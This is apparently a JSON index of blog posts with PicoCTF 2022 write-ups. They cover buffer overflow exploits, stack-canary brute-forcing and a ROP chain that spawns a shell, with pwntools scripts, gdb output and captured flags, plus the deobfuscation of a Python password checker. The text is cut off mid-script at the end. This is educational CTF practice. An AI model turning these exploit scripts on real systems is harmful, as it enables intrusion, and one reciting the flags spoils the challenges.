[ { "title": "PicoCTF 2022 - Binary Exploitation", "url": "/posts/picoctf-binary/", "categories": "picoctf", "tags": "buffer overflow, gdb, radare2", "date": "2022-03-30 00:00:00 -0400", "snippet": "Binary Overflow 0ChallengeSmash the stackLet&#39;s start off simple, can you overflow the correct buffer?The program is available here.You can view source here. And connect with it using:nc saturn.picoctf.net 55986Static code analysis#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;signal.h&amp;gt;#define FLAGSIZE_MAX 64char flag[FLAGSIZE_MAX];void sigsegv_handler(int sig) { printf(&quot;%s\\n&quot;, flag); fflush(stdout); exit(1);}void vuln(char *input){ char buf2[16]; strcpy(buf2, input);}int main(int argc, char **argv){ FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;%s %s&quot;, &quot;Please create &#39;flag.txt&#39; in this directory with your&quot;, &quot;own debugging flag.\\n&quot;); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); // Set up signal handler gid_t gid = getegid(); setresgid(gid, gid, gid); printf(&quot;Input: &quot;); fflush(stdout); char buf1[100]; gets(buf1); vuln(buf1); printf(&quot;The program will exit now\\n&quot;); return 0;}We can see that the program handles SIGSEGV by itself by giving away the flag. We should only have to overflow the buffer, which has a size of 16, to cause a SIGSEGV faultSolution Overflow the buffer $ nc saturn.picoctf.net 55986Input: AAAAAAAAAAAAAAAAAAAApicoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1} Buffer Overflow 1ChallengeControl the return addressNow we&#39;re cooking! You can overflow the buffer and return to the flag function in the program.You can view source here.And connect with it using nc saturn.picoctf.net 59626Solution Find padding to EIPgdb-peda$ pattern create 150&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&#39;gdb-peda$ runStarting program: vuln Please enter your string: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAAOkay, time to return... Fingers Crossed... Jumping to 0x41414641Program received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x41 (&#39;A&#39;)EBX: 0x61414145 (&#39;EAAa&#39;)ECX: 0x41 (&#39;A&#39;)EDX: 0xffffffff ESI: 0x1 EDI: 0x80490e0 (&amp;lt;_start&amp;gt;: endbr32)EBP: 0x41304141 (&#39;AA0A&#39;)ESP: 0xff9e05e0 (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)EIP: 0x41414641 (&#39;AFAA&#39;)EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41414641[------------------------------------stack-------------------------------------]0000| 0xff9e05e0 (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0004| 0xff9e05e4 (&quot;AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0008| 0xff9e05e8 (&quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0012| 0xff9e05ec (&quot;2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0016| 0xff9e05f0 (&quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0020| 0xff9e05f4 (&quot;A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0024| 0xff9e05f8 (&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)0028| 0xff9e05fc (&quot;AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41414641 in ?? ()gdb-peda$ pattern offset 0x414146411094796865 found at offset: 44 Find address of vulnerable function to jump togdb-peda$ info functions[...]0x080491c0 __do_global_dtors_aux0x080491f0 frame_dummy0x080491f6 win0x08049281 vuln0x080492c4 main0x0804933e get_return_address0x08049350 __libc_csu_init0x080493c0 __libc_csu_fini0x080493c5 __x86.get_pc_thunk.bp0x080493cc _finiThe address of the win function is 0x080491f6 Exploit and win#!/usr/bin/env pythonimport sysimport warningsfrom pwn import *from struct import pack## Configurationbinary = &#39;/home/h3x/work/ctf/picoctf/bof1/vuln&#39;eip_offset = 44targetAddr = 0x080491f6promptChar = &#39;:&#39;warnings.filterwarnings(&quot;ignore&quot;)def start(argv=[], *a, **kw): if args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([binary] + argv, *a, **kw)## Setup and start procesself = context.binary = ELF(binary, checksec=False)if args.REMOTE: print(&#39;Exploiting {a}:{b}&#39;.format(a=sys.argv[1],b=sys.argv[2]))else: print(&#39;Exploiting {a}&#39;.format(a=binary))context.log_level = &#39;error&#39;proc = start()## Exploitprint(&#39; [*] EIP offset is set at {a}&#39;.format(a=eip_offset))# payloadchain = []chain.append(&#39;A&#39; * eip_offset)chain.append(p32(targetAddr))payload = flat(chain)# run the exploitprint(&#39; [*] Sending payload&#39;)#proc.recvuntil(promptChar).decode()proc.sendlineafter(promptChar,payload)print(&#39; [*] Printing program output&#39;)print(proc.readall().decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;))$ python solve.py REMOTE {&#39;saturn.picoctf.net&#39;,59626}Exploiting saturn.picoctf.net:59626 [*] EIP offset is set at 44 [*] Sending payload [*] Printing program output Okay, time to return... Fingers Crossed... Jumping to 0x80491f6picoCTF{addr3ss3s_ar3_3asy_60fac6aa}Buffer Overflow 2ChallengeControl the return address and argumentsStatic Code Analysis#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#define BUFSIZE 100#define FLAGSIZE 64void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;%s %s&quot;, &quot;Please create &#39;flag.txt&#39; in this directory with your&quot;, &quot;own debugging flag.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; printf(buf);}void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf);}int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Please enter your string: &quot;); vuln(); return 0;}The functions are almost the same as the previous challenge except the win function now needs 2 arguments with values of 0xCAFEF00D and 0xF00DF00D to leak the flagSolution#!/usr/bin/env pythonimport sysimport warningsfrom pwn import *from struct import packdef start(argv=[], *a, **kw): if args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([binary] + argv, *a, **kw)# binary configurationbinary = &#39;./vuln&#39;elf = context.binary = ELF(binary, checksec=False)if args.REMOTE: print(&#39;Exploiting {a}:{b}&#39;.format(a=sys.argv[1],b=sys.argv[2]))else: print(&#39;Exploiting {a}&#39;.format(a=binary))context.log_level = &#39;error&#39;## Exploit# configurationeip_offset = 112print(&#39; [*] EIP offset is set at {a}&#39;.format(a=eip_offset))promptChar = &#39;:&#39;# start processproc = start()# payloadchain = []chain.append(&#39;A&#39; * eip_offset)chain.append(p32(0x08049296))chain.append(&#39;B&#39; * 4)chain.append(p32(0xcafef00d))chain.append(p32(0xf00df00d))payload = flat(chain)# run the exploitprint(&#39; [*] Sending payload&#39;)proc.recvuntil(promptChar).decode()proc.sendline(payload)print(&#39; [*] Printing program output&#39;)print(proc.readall().decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;))Buffer Overflow 3ChallengeDo you think you can bypass the protection and get the flag?Static Code Analysis#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;wchar.h&amp;gt;#include &amp;lt;locale.h&amp;gt;#define BUFSIZE 64#define FLAGSIZE 64#define CANARY_SIZE 4void win() { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;%s %s&quot;, &quot;Please create &#39;flag.txt&#39; in this directory with your&quot;, &quot;own debugging flag.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read puts(buf); fflush(stdout);}char global_canary[CANARY_SIZE];void read_canary() { FILE *f = fopen(&quot;canary.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;%s %s&quot;, &quot;Please create &#39;canary.txt&#39; in this directory with your&quot;, &quot;own debugging canary.\\n&quot;); exit(0); } fread(global_canary,sizeof(char),CANARY_SIZE,f); fclose(f);}void vuln(){ char canary[CANARY_SIZE]; char buf[BUFSIZE]; char length[BUFSIZE]; int count; int x = 0; memcpy(canary,global_canary,CANARY_SIZE); printf(&quot;%s %s %s&quot;,&quot;Global Canary: &quot;,global_canary,&quot;\\n&quot;); printf(&quot;%s %s %s&quot;,&quot;Canary: &quot;,canary,&quot;\\n&quot;); printf(&quot;How Many Bytes will You Write Into the Buffer?\\n&amp;gt; &quot;); while (x&amp;lt;BUFSIZE) { read(0,length+x,1); if (length[x]==&#39;\\n&#39;) break; x++; } sscanf(length,&quot;%d&quot;,&amp;amp;count); printf(&quot;Input&amp;gt; &quot;); read(0,buf,count); printf(&quot;%s %s %s&quot;,&quot;Global Canary: &quot;,global_canary,&quot;\\n&quot;); printf(&quot;%s %s %s&quot;,&quot;Canary: &quot;,canary,&quot;\\n&quot;); if (memcmp(canary,global_canary,CANARY_SIZE)) { printf(&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\\n&quot;); // crash immediately exit(-1); } printf(&quot;Ok... Now Where&#39;s the Flag?\\n&quot;); fflush(stdout);}int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); read_canary(); vuln(); return 0;}This time, the vuln function has a buffer overflow protection called a canary. The goal the the stack canary is to detect stack modification. If the canary if overwritten, the program will fail.This means if we want to overwrite EIP, we will have to find the value of the canary and his position in the stackSolutionFinding canary offsetTo find the canary offset, we will send an ever growing payload, until the program crashes with error message ***** Stack Smashing Detected ***** : Canary Value Corrupt!from pwn import *context.log_level = &#39;error&#39;for i in range(100): pad = &#39;A&#39;*(i+1) dummycanary = &#39;D&#39; payload = pad #+ dummycanary r = process(&#39;./vuln&#39;) r.writeline(str(len(payload))) r.writeline(payload) resp = r.readall() if b&#39;Smash&#39; in resp: print(&#39;Offset: ({a})&#39;.format(a=len(payload) - 1)) break else: r.close()Output:64This script returns an offset of 64Now that we know where in the stack the canary, we have to find it’s valueWhat we will do is build a buffer of 64 chars to reach the canary, then we’ll try every printable characters at every position until the program doesn’t give any errorsfrom pwn import *offset = 64context.log_level = &#39;error&#39;canary = &#39;&#39;for p in range(4): for c in range(33,126): padding = &#39;A&#39; * offset payload = padding + canary + chr(c) r = process(&#39;./vuln&#39;) r.writeline(str(len(payload))) r.writeline(payload) resp = r.readall() if b&#39;Ok...&#39; in resp: canary += chr(c) print(canary) break r.close() if len(canary) == 4: breakOutput:1131331337Now that we have the position and value of the canary, we are ready to find the offset to reach EIP. We’ll be using GDB for this task:$ gdb-peda -q ./vuln Reading symbols from ./vuln...(No debugging symbols found in ./vuln)gdb-peda$ python print(&#39;A&#39; * 64 + &#39;1337&#39;)AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1337gdb-peda$ pattern create 100&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#39;gdb-peda$ runStarting program: /home/h3x/work/ctf/picoctf/bof3/vuln warning: Error disabling address space randomization: Operation not permittedHow Many Bytes will You Write Into the Buffer?&amp;gt; 200Input&amp;gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1337AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALOk... Now Where&#39;s the Flag?Program received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x41414241 (&#39;ABAA&#39;)ECX: 0x6c0 EDX: 0xf7f31d67 --&amp;gt; 0xf330d40a ESI: 0x1 EDI: 0x8049220 (&amp;lt;_start&amp;gt;: endbr32)EBP: 0x6e414124 (&#39;$AAn&#39;)ESP: 0xffe6b4f0 (&quot;A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)EIP: 0x41434141 (&#39;AACA&#39;)EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41434141[------------------------------------stack-------------------------------------]0000| 0xffe6b4f0 (&quot;A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0004| 0xffe6b4f4 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0008| 0xffe6b4f8 (&quot;AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0012| 0xffe6b4fc (&quot;A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0016| 0xffe6b500 (&quot;EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0020| 0xffe6b504 (&quot;AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0024| 0xffe6b508 (&quot;AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)0028| 0xffe6b50c (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\\n&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41434141 in ?? ()gdb-peda$ pattern offset 0x414341411094926657 found at offset: 16EIP is 16 bytes past the canaryNow let’s find out the address to jump togdb-peda$ info functions[...]0x08049330 frame_dummy0x08049336 win &amp;lt;---------0x080493d5 read_canary0x08049461 vuln0x08049588 main0x08049600 __libc_csu_init[...]With everything in hands, let’s pwn the binary. Here’s the full exploit script:#!/usr/bin/env pythonimport sysimport warningsfrom pwn import *from struct import packcontext.log_level = &#39;ERROR&#39;warnings.filterwarnings(&quot;ignore&quot;)def bfcanary(offset): canary = &#39;&#39; for p in range(4): for c in range(33,126): padding = &#39;A&#39; * offset payload = padding + canary + chr(c) proc = remote(&#39;saturn.picoctf.net&#39;,58840) proc.sendlineafter(promptChar,str(len(payload))) proc.sendlineafter(promptChar,payload) resp = proc.readall() if b&#39;Ok...&#39; in resp: canary += chr(c) break proc.close() if len(canary) == 4: break return canary## Configurationcanary_offset = 64binary = &#39;/home/h3x/work/ctf/picoctf/bof3/vuln&#39;eip_offset = 16targetAddr = 0x08049336promptChar = &#39;&amp;gt;&#39;print(&#39;Exploit Started&#39;)## Find canary valueprint(&#39; [*] Bruteforcing Canary...&#39;)canary = bfcanary(canary_offset)print(&#39; [*] Canary value found: {a}&#39;.format(a=canary))## Setup and start processcontext.log_level = &#39;error&#39;proc = remote(&#39;saturn.picoctf.net&#39;,58840)## Exploitprint(&#39; [*] EIP offset is set at {a}&#39;.format(a=eip_offset))# payloadchain = []chain.append(&#39;A&#39; * canary_offset)chain.append(canary)chain.append(&#39;B&#39; * eip_offset)chain.append(p32(targetAddr))payload = flat(chain)# run the exploitprint(&#39; [*] Sending payload&#39;)#proc.recvuntil(promptChar).decode()proc.sendlineafter(promptChar,&#39;200&#39;)proc.sendlineafter(promptChar,payload)print(&#39; [*] Printing program output&#39;)print(proc.readall().decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;))Output:$ python solve.pyExploit Started [*] Bruteforcing Canary... [*] Canary value found: BiRd [*] EIP offset is set at 16 [*] Sending payload [*] Printing program output Ok... Now Where&#39;s the Flag?picoCTF{Stat1C_c4n4r13s_4R3_b4D_f7c1f50a}ropfuChallengeWhat&#39;s ROPHint: A classic ROP to get a shellSolutionTo get this flag, I had to do a ROP exploit to launch a shell via syscall.I spent a loooot of time trying to build a payload by myself by checking gadgets one by one. I finally figured that ROPgadget (which I was using to the thing by hands) can give away the solution :$ ROPgadget --binary vuln --rop --badbytes &quot;0a&quot;[...]# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = &#39;&#39;p += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5060) # @ .datap += pack(&#39;&amp;lt;I&#39;, 0x41414141) # paddingp += pack(&#39;&amp;lt;I&#39;, 0x080b074a) # pop eax ; retp += &#39;/bin&#39;p += pack(&#39;&amp;lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5064) # @ .data + 4p += pack(&#39;&amp;lt;I&#39;, 0x41414141) # paddingp += pack(&#39;&amp;lt;I&#39;, 0x080b074a) # pop eax ; retp += &#39;//sh&#39;p += pack(&#39;&amp;lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5068) # @ .data + 8p += pack(&#39;&amp;lt;I&#39;, 0x41414141) # paddingp += pack(&#39;&amp;lt;I&#39;, 0x0804fb90) # xor eax, eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x08049022) # pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5060) # @ .datap += pack(&#39;&amp;lt;I&#39;, 0x08049e39) # pop ecx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5068) # @ .data + 8p += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5068) # @ .data + 8p += pack(&#39;&amp;lt;I&#39;, 0x080e5060) # padding without overwrite ebxp += pack(&#39;&amp;lt;I&#39;, 0x0804fb90) # xor eax, eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0804a3d2) # int 0x80I just had to use the output from ROPgadget to complete the exploit script:#!/usr/bin/env python2# execve generated by ROPgadgetfrom pwn import *from struct import pack# Padding goes herep = b&#39;A&#39; * 28p += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5060) # @ .datap += pack(&#39;&amp;lt;I&#39;, 0x41414141) # paddingp += pack(&#39;&amp;lt;I&#39;, 0x080b074a) # pop eax ; retp += b&#39;/bin&#39;p += pack(&#39;&amp;lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5064) # @ .data + 4p += pack(&#39;&amp;lt;I&#39;, 0x41414141) # paddingp += pack(&#39;&amp;lt;I&#39;, 0x080b074a) # pop eax ; retp += b&#39;//sh&#39;p += pack(&#39;&amp;lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5068) # @ .data + 8p += pack(&#39;&amp;lt;I&#39;, 0x41414141) # paddingp += pack(&#39;&amp;lt;I&#39;, 0x0804fb90) # xor eax, eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x08049022) # pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5060) # @ .datap += pack(&#39;&amp;lt;I&#39;, 0x08049e39) # pop ecx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5068) # @ .data + 8p += pack(&#39;&amp;lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; retp += pack(&#39;&amp;lt;I&#39;, 0x080e5068) # @ .data + 8p += pack(&#39;&amp;lt;I&#39;, 0x080e5060) # padding without overwrite ebxp += pack(&#39;&amp;lt;I&#39;, 0x0804fb90) # xor eax, eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0808055e) # inc eax ; retp += pack(&#39;&amp;lt;I&#39;, 0x0804a3d2) # int 0x80proc = remote(&#39;saturn.picoctf.net&#39;,57096)proc.recvuntil(&#39;!\\n&#39;)proc.sendline(p)proc.interactive()Output:$ python exploit.py [+] Opening connection to saturn.picoctf.net on port 57096: Done proc.recvuntil(&#39;!\\n&#39;)[*] Switching to interactive mode$ lsflag.txtvuln$ cat flag.txtpicoCTF{5n47ch_7h3_5h311_029ab653}" }, { "title": "PicoCTF 2022 - Reverse Engineering Challenges", "url": "/posts/picoctf-reverse/", "categories": "picoctf", "tags": "reverse, gdb, radare2, ida", "date": "2022-03-29 00:00:00 -0400", "snippet": "Bloat.pyChallengeCan you get the flag?Run this Python program in the same directory as this encrypted flag.We are given 2 files: bloat.flag.py : a script that asks for a password and gives the flag if it’s ok flag.txt.enc : the encrypted flagbloat.flag.pyimport sysa = &quot;!\\&quot;#$%&amp;amp;&#39;()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; + &quot;[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ &quot;def arg133(arg432): if arg432 == a[71] + a[64] + a[79] + a[79] + a[88] + a[66] + a[71] + a[64] + a[77] + a[66] + a[68]: return True else: print(a[51] + a[71] + a[64] + a[83] + a[94] + a[79] + a[64] + a[82] + a[82] + a[86] + a[78] + a[81] + a[67] + a[ 94] + a[72] + a[82] + a[94] + a[72] + a[77] + a[66] + a[78] + a[81] + a[81] + a[68] + a[66] + a[83]) sys.exit(0) return Falsedef arg111(arg444): return arg122(arg444.decode(), a[81] + a[64] + a[79] + a[82] + a[66] + a[64] + a[75] + a[75] + a[72] + a[78] + a[77])def arg232(): return input( a[47] + a[75] + a[68] + a[64] + a[82] + a[68] + a[94] + a[68] + a[77] + a[83] + a[68] + a[81] + a[94] + a[66] + a[78] + a[81] + a[81] + a[68] + a[66] + a[83] + a[94] + a[79] + a[64] + a[82] + a[82] + a[86] + a[78] + a[81] + a[67] + a[94] + a[69] + a[78] + a[81] + a[94] + a[69] + a[75] + a[64] + a[70] + a[25] + a[94])def arg132(): return open(&#39;flag.txt.enc&#39;, &#39;rb&#39;).read()def arg112(): print(a[54] + a[68] + a[75] + a[66] + a[78] + a[76] + a[68] + a[94] + a[65] + a[64] + a[66] + a[74] + a[13] + a[13] + a[13] + a[94] + a[88] + a[78] + a[84] + a[81] + a[94] + a[69] + a[75] + a[64] + a[70] + a[11] + a[94] + a[84] + a[82] + a[68] + a[81] + a[25])def arg122(arg432, arg423): arg433 = arg423 i = 0 while len(arg433) &amp;lt; len(arg432): arg433 = arg433 + arg423[i] i = (i + 1) % len(arg423) return &quot;&quot;.join([chr(ord(arg422) ^ ord(arg442)) for (arg422, arg442) in zip(arg432, arg433)])arg444 = arg132()arg432 = arg232()arg133(arg432)arg112()arg423 = arg111(arg444)print(arg423)sys.exit(0)SolutionThe script is obviously obfuscated. Modified version that gives the flag without asking for password :import sysa = &quot;!\\&quot;#$%&amp;amp;&#39;()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;+&quot;[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ &quot;def arg133(arg432): if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]: return True else: print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\\a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\\a[81]+a[68]+a[66]+a[83]) sys.exit(0) return Falsedef arg111(arg444): return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\\a[75]+a[72]+a[78]+a[77])def arg232(): return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\\a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\\a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\\a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94])def arg132(): return open(&#39;flag.txt.enc&#39;, &#39;rb&#39;).read()def arg112(): print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\\a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\\a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25])def arg122(arg432, arg423): arg433 = arg423 i = 0 while len(arg433) &amp;lt; len(arg432): arg433 = arg433 + arg423[i] i = (i + 1) % len(arg423) return &quot;&quot;.join([chr(ord(arg422) ^ ord(arg442)) for (arg422,arg442) in zip(arg432,arg433)])arg444 = arg132()arg423 = arg111(arg444)print(arg423)sys.exit(0)Fresh JavaChallengeCan you get the flag?Reverse engineer this Java program.SolutionWe have to decompile the java class to get the flag.I used cfr for the taskSolve script:#!/usr/bin/env pythonimport subprocessimport recfrjar = 